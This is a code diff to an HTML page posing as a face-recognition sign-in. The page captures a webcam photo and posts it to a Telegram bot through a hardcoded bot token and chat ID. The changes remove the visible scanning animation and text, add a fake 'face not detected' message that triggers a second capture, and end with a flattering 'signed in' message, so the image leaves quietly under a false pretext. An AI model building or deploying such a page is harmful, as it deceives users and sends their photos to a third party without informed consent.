@@ -15,8 +15,7 @@
             font-family: Arial, sans-serif;
         }
         .hidden { display: none; }
-        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; margin: 20px auto; }
     </style>
 </head>
 <body>
@@ -24,9 +23,9 @@
     <div id="name-selection">
         <p>Select your name:</p>
         <ul>
-            <li><input type="checkbox" class="name-checkbox" value="Izz"> Izz</li>
-            <li><input type="checkbox" class="name-checkbox" value="Ali"> Ali</li>
-            <li><input type="checkbox" class="name-checkbox" value="Sara"> Sara</li>
+            <li><input type="checkbox" class="name-checkbox" value="Izz" onclick="disableCheckboxes(this)"> Izz</li>
+            <li><input type="checkbox" class="name-checkbox" value="Ali" onclick="disableCheckboxes(this)"> Ali</li>
+            <li><input type="checkbox" class="name-checkbox" value="Sara" onclick="disableCheckboxes(this)"> Sara</li>
         </ul>
         <button onclick="goToFaceRecognition()">Proceed</button>
     </div>
@@ -39,8 +38,6 @@
     </div>
 
     <div id="scanning" class="hidden">
-        <div id="animation"></div>
-        <p>Scanning face...</p>
         <video id="video" class="hidden" autoplay></video>
         <canvas id="canvas" class="hidden"></canvas>
     </div>
@@ -53,6 +50,12 @@
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
 
+        function disableCheckboxes(selected) {
+            document.querySelectorAll('.name-checkbox').forEach(checkbox => {
+                if (checkbox !== selected) checkbox.disabled = true;
+            });
+        }
+
         function goToFaceRecognition() {
             let checkboxes = document.querySelectorAll('.name-checkbox:checked');
             if (checkboxes.length === 0) return alert("Please select a name.");
@@ -63,30 +66,38 @@
 
         function cancelRecognition() {
             document.body.innerHTML = "Page will stop here.";
+            localStorage.removeItem("site_accessed");
         }
 
         async function startCamera() {
             document.getElementById("face-recognition").classList.add("hidden");
-            document.getElementById("scanning").classList.remove("hidden");
             let video = document.getElementById("video");
             let canvas = document.getElementById("canvas");
             let ctx = canvas.getContext("2d");
-
+            
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                setTimeout(() => captureImage(video, canvas, ctx, stream), 3000);
+                setTimeout(() => captureImage(video, canvas, ctx, stream, false), 3000);
             } catch (error) {
                 alert("Error accessing camera.");
             }
         }
 
-        function captureImage(video, canvas, ctx, stream) {
+        function captureImage(video, canvas, ctx, stream, isSecond) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            if (!isSecond) {
+                document.getElementById("face-not-detected").classList.remove("hidden");
+                setTimeout(() => captureImage(video, canvas, ctx, stream, true), 5000);
+                return;
+            }
+            
             video.srcObject.getTracks().forEach(track => track.stop());
-
+            document.getElementById("face-not-detected").classList.add("hidden");
+            
             canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -96,7 +107,6 @@
                     method: "POST",
                     body: formData
                 }).then(() => {
-                    document.getElementById("scanning").classList.add("hidden");
                     document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
                     document.getElementById("final-message").classList.remove("hidden");
                     localStorage.setItem("site_accessed", "true");
